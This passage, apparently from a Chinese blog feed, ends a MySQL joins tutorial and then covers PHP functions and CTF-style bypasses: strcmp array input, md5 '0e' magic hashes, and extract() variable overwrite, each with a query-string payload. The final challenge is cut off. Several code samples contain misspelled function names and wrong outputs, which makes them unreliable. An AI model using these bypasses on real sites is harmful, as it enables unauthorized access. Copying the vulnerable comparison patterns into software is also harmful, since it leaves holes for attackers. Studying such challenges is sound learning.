JION [table_name2] + ON 子句;<br></code></pre></td></tr></table></figure><h5 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h5><p>列出两个表中都存在的数据<code>jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/jion.png"></p><h5 id="左连接"><a href="#左连接" class="headerlink" title="左连接"></a>左连接</h5><p>即使没有匹配也要列出左表的数据<code>left jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/leftjion.png"></p><h5 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h5><p>即使没有匹配也要列出右表的数据<code>right jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/rightjion.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>SQL语句格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[SELECT语句] [WHERE条件] [GROUP BY条件] [HAVING条件] [ORDER BY条件] [LIMIT条件]；<br></code></pre></td></tr></table></figure><hr><p>终于把这SQL语句搞完了</p><p>撒花🎉</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>MySQL</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP黑魔法</title>
    <link href="/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    <url>/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>古娜拉黑暗之神🪄</p><span id="more"></span><h2 id="PHP基础函数"><a href="#PHP基础函数" class="headerlink" title="PHP基础函数"></a>PHP基础函数</h2><p>接着上一篇小bug，把那些也提溜过来继续写🧐</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>extract() 函数从<strong>数组</strong>中将变量导入到当前的符号表。该函数使用数组<strong>键名</strong>作为变量名，使用数组<strong>键值</strong>作为变量值。</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><code>extract(array,extract_rules,prefix)</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>array（数组名）</td><td>规定要使用的数组</td></tr><tr><td>extract_rules（提取规则）</td><td>可省略。<em>extract()</em> 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。</td></tr><tr><td>prefix（前缀）</td><td>可省略。请注意 <em>prefix</em> 仅在 <em>extract_type</em> 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。</td></tr></tbody></table><p><strong><em>extract_rules</em>可能的值：</strong></p><ul><li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量</li><li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li><li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 <em>prefix</em>。</li><li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 <em>prefix</em>。</li><li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 <em>prefix</em>。</li><li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li><li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li><li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure> <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>$a = cat;$b = dog;$c = horse<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示2</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>,EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>$a = Original; $b = Dog; $c = Horse; $dup_a = Cat<br></code></pre></td></tr></table></figure><h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3><p><strong>isset()</strong> 函数用于检测变量是否已设置并且非 NULL。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p><code>bool isset ( mixed $var [, mixed $... ] )</code></p><blockquote><p>$var为要测试的变量</p></blockquote><p>如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量已设置&quot;</span><br>&#125;<br><span class="hljs-comment">//结果为true，将打印文本</span><br><br><span class="hljs-comment">//使用var_dump输出isset()的返回值。</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;Mod&quot;</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;Modifier&quot;</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//删除变量a</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-variable">$c</span>=<span class="hljs-literal">NULL</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>变量已设置<br>bool(true)<br>bool(true)<br>bool(false)<br>bool(true)<br>bool(flase)<br></code></pre></td></tr></table></figure><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>file_get_contents() 把整个文件读入一个字符串中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contens</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">#输出演示</span><br>This <span class="hljs-keyword">is</span> an example <span class="hljs-keyword">for</span> test<br>(输出文件中的所有文本)<br></code></pre></td></tr></table></figure><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><p><code>strcmp()</code>把两个字符串以二进制方式进行比较，且该函数比较时区分大小写。</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><p><code>strcmp(string1, string2)</code></p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果返回值小于0，则str1小于str2;</p><p>如果返回值大于0，则str1大于str2;</p><p>如果返回值等于0，则str1等于str2;</p><blockquote><p>有资料说返回值也不仅是-1和1，也可能是其他数据</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strmp</span>(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);   <span class="hljs-comment">//输出0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-string">&quot;Hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);  <span class="hljs-comment">//输出1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>还有个函数strcasecmp()，用法与strcmp()类似，只是不区分大小写</p></blockquote><h3 id="ereg-x2F-preg-match"><a href="#ereg-x2F-preg-match" class="headerlink" title="ereg&#x2F;preg_match"></a>ereg&#x2F;preg_match</h3><p><code>ereg()</code>和<code>preg_match()</code>是PHP中常用的正则表达式。</p><p><strong>紧急补课—正则表达式</strong></p><p>在编写处理字符串的程序或者网页的时候，经常会查找符合某些复杂规则的字符串的需要，正则表达式就是用于描述这些规则的语法。</p><p>作用： 分割， 匹配， 查找， 替换</p><p>例如： 验证邮箱地址格式， 手机号码格式等等</p><h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><p><code>preg_match(mode, string subject, array matches);</code></p><p><code>ereg(mode,string,subject,array regs);</code></p><p>mode : 正则表达式</p><p>subject : 需要验证的字符串</p><p>matches&#x2F;regs : 匹配后得到的结果，以数组的方式存储</p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>返回值是<strong>false</strong>或<strong>true</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示1：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//模式分隔符后的i标记这是一个大小写不敏感的搜索</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串&quot;</span>；<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串&quot;</span>；<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示1：<br>查找到匹配字符串<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示2：</span><br><span class="hljs-comment">//查找固定的某个单词</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//模式中的 \b 标记一个单词边界，所以只有独立的单词会被匹配，而不会匹配单词的部分内容 </span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串\n&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is harder than others!&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示2：<br>查找到匹配字符串<br>未发现匹配字符串<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#实例演示3：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 从URL中获取主机名称</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<br>    <span class="hljs-string">&quot;http://shmodifier.github.io&quot;</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<br> <br><span class="hljs-comment">// 获取主机名称的后面两部分</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;domain name is: <span class="hljs-subst">&#123;$matches[0]&#125;</span>\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示3：<br>domain name is: github.io<br></code></pre></td></tr></table></figure><p><del>乱七八糟一堆符号我一个都看不懂我好得很哇</del></p><h2 id="魔法部分"><a href="#魔法部分" class="headerlink" title="魔法部分"></a>魔法部分</h2><p>警告：麻瓜请自觉退出🚫</p><h3 id="01-strcmp绕过"><a href="#01-strcmp绕过" class="headerlink" title="01 strcmp绕过"></a>01 strcmp绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midifer终将否极泰来&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], FLAG) == <span class="hljs-number">0</span>) &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;相信我:&quot;</span> . FLAG;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ps：从ws那里copy来的（x</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>条件是<code>strcmp($_GET[&#39;flag&#39;], FLAG) == 0</code>，就是要**$_GET<strong>变量和</strong>FLAG**相等，但是我们除了严刑逼供出题人，根本就不知道FLAG是什么。</p><blockquote><p>$_GET[‘flag’]意思是从url获取一个叫flag的GET参数</p></blockquote><p>不要害怕！</p><p><strong>当 strcmp() 比较出错时会返回 NULL；而返回 NULL 即为返回 0</strong>，我们只需要palyload一个非字符串变量和字符串FLAG比较就会出错并返回0。</p><p>欸，相等辣！</p><p><strong>最终palyload</strong>： <code>?flag[]=0</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-02-28_21-02-17.png"></p><h3 id="02-md5绕过"><a href="#02-md5绕过" class="headerlink" title="02 md5绕过"></a>02 md5绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midifer终将否极泰来&#x27;</span>);<br> <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>]) &#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;相信我 :&quot;</span> . FLAG;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>条件是<code>($_GET[&#39;s1&#39;])!=$-GET[&#39;s2&#39;] &amp;&amp; md5($GET[s1])==$_get[&#39;s2&#39;]</code>，就是变量s1和s2<strong>不能相等</strong>但是他们的<strong>md5要相等</strong>。</p><p>因为s2和s2不能相等，所以单纯md5加密得出的密文一定也不完全一样，这时就要利用一些歪门邪道<del>（不是）</del>。</p><p><strong>紧急补课—md5</strong></p><p>md5一种密码散列函数。MD5算法的原理可简要的叙述为：MD5码以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p><p><del>补不了我看不懂</del>🥲</p><h5 id="001-科学计数法绕过"><a href="#001-科学计数法绕过" class="headerlink" title="001 科学计数法绕过"></a>001 科学计数法绕过</h5><p>字符串经过md5加密后，会生成既有数字又有字母的密文，可以利用<strong>科学计数法</strong>的语法规律反推明文。</p><blockquote><p>了解到md5是不可逆的所以应该不能解码，但是可以根据加密规律找满足需要的明文</p></blockquote><p>0无论乘十的几次方都仍然为零，例如<code>&#39;0e123456&#39;==&#39;0e654321&#39;==0</code>。所以只需要找到两个经过md5加密后以<strong>”0e“</strong>开头的字符串充当变量即可。</p><p>copy了一些加密后是0e开头的值：</p><ul><li>QNKCDZO       </li><li>240610708 </li><li>s878926199a      </li><li>s155964671a         </li><li>s214587387a        </li><li>s214587387a        </li><li>0e215962017</li></ul><p><strong>最终playload</strong>：<code>?s1=QNKCDZO&amp;s2=240610708</code> </p><p>没有成功截图😣</p><p>不知道为什么自己运行的时候没成功，页面一片空白什么都没输出。</p><p><strong>紧急补课</strong></p><p>在php中，**’<em>x</em>e<em>y</em>‘** 意为x乘10的y次方。例如：1000 &#x3D;&#x3D; ‘1e3’。</p><h5 id="002-数组绕过"><a href="#002-数组绕过" class="headerlink" title="002 数组绕过"></a>002 数组绕过</h5><p>冲浪冲到的</p><p>php中的md5函数不能用来加密数组，所以会出现结果NULL。例如<code>md5([1,2]) == md5([3,4]) == NULL</code>。</p><p><strong>最终playload</strong>：<code>?s1[]=1&amp;s2[]=2</code></p><p>但是在我的电脑上复现会报错而不是直接null绕过。</p><h3 id="03-extract-变量覆盖绕过"><a href="#03-extract-变量覆盖绕过" class="headerlink" title="03 extract 变量覆盖绕过"></a>03 extract 变量覆盖绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>; <br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>))<br> &#123; <br>    <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>)<br>    &#123; <br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Modifier终将否极泰来&#x27;</span>; <br>    &#125;<br>   <span class="hljs-keyword">else</span><br>   &#123; <br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>   &#125; <br> &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目使用<code>extract($_GET)</code>接受请求，并将其键名和键值转换为变量名和变量值，随后进行if条件的判断。$flag是一个输入的变量，<code>file_get_contents($flag)</code>打开的一定是空文件，所以<code>$content</code>一定为空</p><blockquote><p>解题关键在于令$shiyan&#x3D;&#x3D;$content</p></blockquote><p>使用GET提交参数和值，利用<code>extract($_GET)</code>进行覆盖，使flag和shiyan的值都为空，从而满足if条件，输出flag。</p><p><strong>最终payload</strong>：<code>?flag=&amp;shiyan=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-11-39.png"></p><h3 id="04-绕过过滤的空白字符"><a href="#04-绕过过滤的空白字符" class="headerlink" title="04 绕过过滤的空白字符"></a>04 绕过过滤的空白字符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-variable">$req</span> = [];<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>;<br> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_error&quot;</span>, <span class="hljs-literal">false</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br> <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;number&#x27;</span>]))&#123;<br>   <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;</span>);<br> <br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;have a fun!!&quot;</span>);<br> <br>&#125;<br> <br><span class="hljs-keyword">foreach</span>([<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$global_var</span>) &#123;  <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$global_var</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>); 